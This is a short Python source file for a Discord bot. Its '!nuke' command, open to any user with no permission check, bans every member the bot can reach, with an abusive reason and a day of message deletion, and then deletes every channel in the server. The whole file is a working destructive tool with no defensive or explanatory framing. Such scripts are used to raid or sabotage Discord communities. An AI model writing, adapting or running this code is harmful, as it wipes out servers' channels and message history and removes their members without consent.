import discord

client = discord.Client()

@client.event
async def on_ready():
    print('Logged in!')

@client.event
async def on_message(message):
    if message.author == client.user:
        return
    if message.content.startswith('!check'):
        print('lets get it')
    if message.content.startswith('!nuke'):
        for member in client.get_all_members():
            try:
                await member.ban(reason="get fucked", delete_message_days=1)
            except:
                continue
        for channel in message.guild.channels:
            await channel.delete()
            
client.run('XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX')


